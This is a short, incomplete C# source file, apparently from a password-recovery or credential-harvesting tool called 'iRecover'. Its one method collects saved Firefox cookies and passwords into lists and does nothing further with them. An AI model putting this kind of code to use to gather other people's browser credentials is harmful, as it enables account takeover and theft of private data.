using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace iRecover
{
    public static class Browsers
    {
        public static void FireFox()
        {
            List<FirefoxCookie> firefoxCookies = Firefox.Cookies();
            List<FirefoxPassword> firefoxPasswords = Firefox.Passwords();

        }
    }
}
